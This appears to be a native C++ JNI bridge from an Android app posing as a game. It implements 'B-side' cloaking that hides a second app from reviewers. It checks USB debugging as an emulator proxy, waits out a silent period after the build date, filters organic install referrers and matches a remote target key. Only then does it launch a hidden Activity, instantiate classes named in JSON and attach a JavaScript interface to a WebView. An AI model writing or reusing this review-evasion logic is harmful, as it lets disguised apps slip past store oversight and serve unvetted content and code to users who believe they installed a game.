#include <jni.h>
#include "utils/ActivityUtils.h"
#include "utils/MethodUtils.h"
#include "utils/FieldUtils.h"
#include "utils/LogUtils.h"
#include "utils/TimeUtils.h"
#include "utils/StringUtils.h"
#include "utils/ArrayUtils.h"
#include "json/json.hpp"

/**
 * 初始化
 */
extern "C"
JNIEXPORT void JNICALL
Java_eggy_game_core_JniBridge_init(JNIEnv *env, jobject obj, jboolean isLoggable) {
    //设置log开关
    LogUtils::setDebug(isLoggable == JNI_TRUE);
}

/**
 * 启动B面前检查模拟器和静默时间
 */
extern "C"
JNIEXPORT jboolean JNICALL
Java_eggy_game_core_JniBridge_canInspect(JNIEnv *env, jobject obj) {
    //检测是否模拟器
    jboolean isUsbDebuggingEnabled = MethodUtils::callMethod<jboolean>(env, obj,
                                                                       "isUsbDebuggingEnabled",
                                                                       "()Z");
    //模拟器，直接跳A
    if (isUsbDebuggingEnabled == JNI_TRUE) {
        LogUtils::d("inspect cancel, it's usb debugging enabled");
        return false;
    }
    //获取打包时间
    jlong APP_BUILD_TIME = FieldUtils::getStaticField<jlong>(env, obj,
                                                             "mReleaseTime", "J");
    long long buildTime = static_cast<long long>(APP_BUILD_TIME);
    //获取静默时间（小时）
    jlong SILENT_HOURS = FieldUtils::getStaticField<jlong>(env, obj,
                                                           "mDelayTime", "J");
    //小时转毫秒
    long silentHours = static_cast<long>(SILENT_HOURS);
    //静默期未到，直接跳A
    if (TimeUtils::getCurrentTimeMillis() < (buildTime + silentHours)) {
        LogUtils::d("inspect cancel, it's not the time");
        return false;
    }
    return true;
}

/**
 * 判断是否自然流量
 */
extern "C"
JNIEXPORT jboolean JNICALL
Java_eggy_game_core_JniBridge_isOrganicTraffic(JNIEnv *env, jobject thiz, jstring jreferrer) {
    std::string referrer = StringUtils::jString2string(env, jreferrer);
    if (StringUtils::containsIgnoreCase(referrer, "unknown")
        || StringUtils::contains(referrer, "utm_source=(not20%set)&utm_medium=(not20%set)")
        || StringUtils::contains(referrer, "utm_medium=organic")) {
        LogUtils::d("inspect cancel, Channel: %s: ", referrer.c_str());
        return true;
    }
    return false;
}

bool mIsStart = false;

/**
 * 判断target是否相等
 */
extern "C"
JNIEXPORT jboolean JNICALL
Java_eggy_game_core_JniBridge_equalsKey(JNIEnv *env, jobject obj, jstring jkey) {
    //获取打包时间
    jstring FIREBASE_TARGET = FieldUtils::getStaticField<jstring>(env, obj,
                                                                  "mTarget",
                                                                  "Ljava/lang/String;");
    std::string target = StringUtils::jString2string(env, FIREBASE_TARGET);
    std::string key = StringUtils::jString2string(env, jkey);
    mIsStart = target == key;
    return mIsStart;
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_eggy_game_core_JniBridge_checkKey(JNIEnv *env, jobject obj) {
    return mIsStart;
}


/**
 * 启动B面
 */
extern "C"
JNIEXPORT void JNICALL
Java_eggy_game_core_JniBridge_launcher(JNIEnv *env, jobject obj, jobject context) {
    if (mIsStart) {
        jstring EXTRA_LAUNCH_TARGET = FieldUtils::getStaticField<jstring>(env, obj,
                                                                          "LAUNCHER",
                                                                          "Ljava/lang/String;");
        std::string launcher = StringUtils::jString2string(env, EXTRA_LAUNCH_TARGET);
        std::string className = StringUtils::jName2cName(launcher);
        //启动Activity
        ActivityUtils::startActivity(env, context, className.c_str(), true);
    }
}


/**
 * 启动activity
 */
extern "C"
JNIEXPORT void JNICALL
Java_eggy_game_core_JniBridge_launcherView(JNIEnv *env, jobject obj, jobject context, jstring name,
                                           jstring key, jstring value) {

    std::string launcher = StringUtils::jString2string(env, name);
    std::string className = StringUtils::jName2cName(launcher);
    jobject intent = IntentUtils::getIntent(env, context, className.c_str(), true);
    IntentUtils::putExtra(env, intent, key, value);
    //启动Activity
    ActivityUtils::startActivity(env, context, intent);
}

/**
 * 根据json数据创建对象
 */
extern "C"
JNIEXPORT jobjectArray JNICALL
Java_eggy_game_core_JniBridge_instanceSDK(JNIEnv *env, jobject thiz, jstring key) {
    //非空判断
    if (key == nullptr) {
        return nullptr;
    }
    std::string target = StringUtils::jString2string(env, key);
    if (target.empty()) {
        return nullptr;
    }
    try {
        //解析数据
        nlohmann::json json = nlohmann::json::parse(target);
        std::vector<std::string> serviceClassPath = json["serviceClassPath"];
        //创建动态数组
        std::vector<jobject> sdks;
        for (std::string className: serviceClassPath) {
            //把字符串中的 . 替换成 /
            className = StringUtils::jName2cName(className);
            //创建对象
            jobject obj = ClassUtils::getInstance(env, className.c_str());
            if (obj != nullptr) {
                //添加到数据
                sdks.push_back(obj);
            }
        }
        //转换成java数组
        return ArrayUtils::vector2jArray(env, sdks);
    } catch (std::exception &e) {
        LogUtils::e("loadSDK error: %s", e.what());
    }
    return nullptr;
}


/**
 * WebView添加交互接口
 */
extern "C"
JNIEXPORT jobject JNICALL
Java_eggy_game_core_JniBridge_addBridge(JNIEnv *env, jobject thiz, jobject context, jobject view) {
    //获取 JavaScriptBridge 包名
    jstring BRIDGE = FieldUtils::getStaticField<jstring>(env, thiz, "BRIDGE", "Ljava/lang/String;");
    std::string bridge = StringUtils::jString2string(env, BRIDGE);
    std::string className = StringUtils::jName2cName(bridge);
    //创建 JavaScriptBridge对象
    jobject javaScriptBridge = ClassUtils::getInstance(env, className.c_str(),
                                                       "(Landroid/content/Context;)V",
                                                       context);

    //调用 addJavascriptInterface 添加 JavaScriptBridge
    jstring key = StringUtils::string2jString(env, "jsextend");
    MethodUtils::callVoidMethod(env, view, "addJavascriptInterface",
                                "(Ljava/lang/Object;Ljava/lang/String;)V", javaScriptBridge, key);
    return javaScriptBridge;
}


/**
 * WebView删除交互接口,释放资源
 */
extern "C"
JNIEXPORT void JNICALL
Java_eggy_game_core_JniBridge_released(JNIEnv *env, jobject thiz, jobject view) {
    jstring key = StringUtils::string2jString(env, "jsextend");
    MethodUtils::callVoidMethod(env, view, "removeJavascriptInterface",
                                "(Ljava/lang/String;)V",key);
    MethodUtils::callVoidMethod(env, view, "destroy", "()V");
}
